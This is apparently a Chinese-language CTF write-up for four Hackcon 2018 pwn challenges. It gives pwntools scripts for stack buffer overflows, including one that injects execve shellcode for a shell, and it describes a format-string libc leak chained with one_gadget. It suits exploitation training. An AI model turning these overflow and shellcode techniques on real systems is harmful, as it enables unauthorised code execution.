# Hackcon 2018 - Notes

## BOF

保護一個都沒開，然後 ida pro 可以看到用 `gets()`

然後存在一個函數 `callMeMaybe()` 會給 flag

所以就是 overflow 跳這個函數就好

```python
#!/usr/bin/env python
from pwn import *
HOST = '127.0.0.1'
PORT = 1234
r = remote(HOST, PORT)

trash = 'a'*40
print r.recvrepeat(0.2)
r.sendline(trash + p64(0x400766))

r.interactive()
```

## She Sells Sea Shells

這題 和 BOF 差別在沒有給你一個函數送你 flag ，其他都一樣

所以需要送 shellcode 然後跳過去，且這題很好心的給了 buf addr

所以意思就是非常明顯，先抓這 buf addr ，然後送 shellcode 到 buf 上面再跳過去就好

```python
#!/usr/bin/env python
from pwn import *
context.arch='amd64'

HOST = '127.0.0.1'
PORT = 1234

r = remote(HOST, PORT)

r.recvuntil('small gift for you (no strings attached) ')
buf_addr = int(r.recvuntil('\n')[:-1],16)
print "buf_addr: ",hex(buf_addr)

shellcode= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = shellcode.ljust(72, '\x00')
r.sendline(shellcode + p64(buf_addr))

r.interactive()
```

## WarChange

沒開保護


看一下組語可以知道要讓 $rbp - 0x4 = 0xdeadbeef 和 $rbp - 0x8 = 0xcafebabe 

用 buffer overflow 蓋過去即可

```python
#!/usr/bin/env python
from pwn import *

HOST = '127.0.0.1'
PORT = 1234

r = remote(HOST, PORT)

target = 0xcafebabe
raw_input()
payload = 'a'*72 + p32(target) + p32(0xdeadbeef)
r.sendline(payload)
r.interactive()
```

## Simple Yet Elegent

這題保護只有開 DEP

然後漏洞有 buffer overflow 和 format string vuln

塞 72 個垃圾可以蓋到 ret ，就可以控制 rip

所以這題利用就是靠 format string leak information 再利用 buffer overflow 來 get shell


首先 gdb break 在 main+102 上面 (也就是 printf) 然後 x/50gx $rsp  看一下當前 leak 出的東西

有沒有可以用的，會發現第 17 個是 `__libc_start_main + 240` ，所以我們可以先用 gdb libc.so.6

然後 `disass __libc_start_main` 看 offset 是 0x20830 ，所以我們只要先用 

format 看第十七個的位址就可以算出 libc addr，那有了 libc 就可以算出 one_gadget

之後透過 overflow 控 rip 蓋 one_gadget 即可














